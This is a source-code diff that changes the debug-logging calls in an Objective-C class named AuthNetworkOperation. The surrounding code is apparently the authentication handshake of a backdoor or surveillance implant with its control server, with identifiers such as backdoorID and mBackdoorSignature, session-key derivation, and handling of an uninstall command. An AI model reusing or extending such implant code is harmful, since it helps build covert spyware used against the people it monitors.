@@ -14,7 +14,8 @@
 #import "NSData+SHA1.h"
 #import "RCSMCommon.h"
 
-//#define DEBUG_AUTH_NOP
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @implementation AuthNetworkOperation
@@ -32,7 +33,7 @@
       mTransport = aTransport;
       
 #ifdef DEBUG_AUTH_NOP
-      infoLog(ME, @"mTransport: %@", mTransport);
+      infoLog(@"mTransport: %@", mTransport);
 #endif
       return self;
     }
@@ -51,7 +52,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_AUTH_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -136,18 +137,18 @@
   [idToken appendData: confKey];
   
 #ifdef DEBUG_AUTH_NOP
-  infoLog(ME, @"kd    : %@", kd);
-  infoLog(ME, @"nOnce : %@", nOnce);
-  infoLog(ME, @"backdoorID  : %@", backdoorID);
-  infoLog(ME, @"instanceID  : %@", instanceID);
-  infoLog(ME, @"type        : %@", type);
-  infoLog(ME, @"confkey     : %@", confKey);
-  infoLog(ME, @"idToken: %@", idToken);
+  infoLog(@"kd    : %@", kd);
+  infoLog(@"nOnce : %@", nOnce);
+  infoLog(@"backdoorID  : %@", backdoorID);
+  infoLog(@"instanceID  : %@", instanceID);
+  infoLog(@"type        : %@", type);
+  infoLog(@"confkey     : %@", confKey);
+  infoLog(@"idToken: %@", idToken);
 #endif
   NSData *shaIDToken = [idToken sha1Hash];
   
 #ifdef DEBUG_AUTH_NOP
-  infoLog(ME, @"shaIDToken: %@", shaIDToken);
+  infoLog(@"shaIDToken: %@", shaIDToken);
 #endif
   
   // Prepare the encrypted message
@@ -160,14 +161,14 @@
   [message appendData: shaIDToken];
   
 #ifdef DEBUG_AUTH_NOP
-  infoLog(ME, @"message: %@", message);
+  infoLog(@"message: %@", message);
 #endif
   
   NSMutableData *encMessage = [[NSMutableData alloc] initWithData: message];
   [encMessage encryptWithKey: mBackdoorSignature];
   
 #ifdef DEBUG_AUTH_NOP
-  infoLog(ME, @"message enc: %@", encMessage);
+  infoLog(@"message enc: %@", encMessage);
 #endif
   
   //
@@ -182,8 +183,8 @@
   if ([replyData length] != 64)
     {
 #ifdef DEBUG_AUTH_NOP
-      errorLog(ME, @"Wrong auth response length");
-      errorLog(ME, @"replyData: %@", replyData);
+      errorLog(@"Wrong auth response length");
+      errorLog(@"replyData: %@", replyData);
 #endif
       
       [kd release];
@@ -211,7 +212,7 @@
                                              encoding: NSUTF8StringEncoding];
   
 #ifdef DEBUG_AUTH_NOP
-  infoLog(ME, @"ks: %@", ks);
+  infoLog(@"ks: %@", ks);
 #endif
   
   // calculate the session key -> K = sha1(Cb || Ks || Kd)
@@ -225,7 +226,7 @@
   gSessionKey = [[NSMutableData alloc] initWithData: [sessionKey sha1Hash]];
   
 #ifdef DEBUG_AUTH_NOP
-  infoLog(ME, @"shaSessionKey: %@", gSessionKey);
+  infoLog(@"shaSessionKey: %@", gSessionKey);
 #endif
   
   // second part of the server response contains the NOnce and the response
@@ -242,7 +243,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_AUTH_NOP
-      errorLog(ME, @"exception on secondPartResponse makerange (%@)", [e reason]);
+      errorLog(@"exception on secondPartResponse makerange (%@)", [e reason]);
 #endif
       
       return NO;
@@ -255,7 +256,7 @@
   if ([nOnce isEqualToData: rNonce] == NO)
     {
 #ifdef DEBUG_AUTH_NOP
-      errorLog(ME, @"Invalid NOnce");
+      errorLog(@"Invalid NOnce");
 #endif
       
       return NO;
@@ -274,7 +275,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_AUTH_NOP
-      errorLog(ME, @"exception on protoCommand makerange (%@)", [e reason]);
+      errorLog(@"exception on protoCommand makerange (%@)", [e reason]);
 #endif
       
       return NO;
@@ -298,20 +299,20 @@
     case PROTO_OK:
       {
 #ifdef DEBUG_AUTH_NOP
-        infoLog(ME, @"Auth Response OK");
+        infoLog(@"Auth Response OK");
 #endif
       } break;
     case PROTO_UNINSTALL:
       {
 #ifdef DEBUG_AUTH_NOP
-        warnLog(ME, @"Uninstall not yet implemented here");
+        warnLog(@"Uninstall not yet implemented here");
 #endif
       } break;
     case PROTO_NO:
     default:
       {
 #ifdef DEBUG_AUTH_NOP
-        errorLog(ME, @"Received command: %d", protoCommand);
+        errorLog(@"Received command: %d", protoCommand);
 #endif
 
         [_protoCommand release];
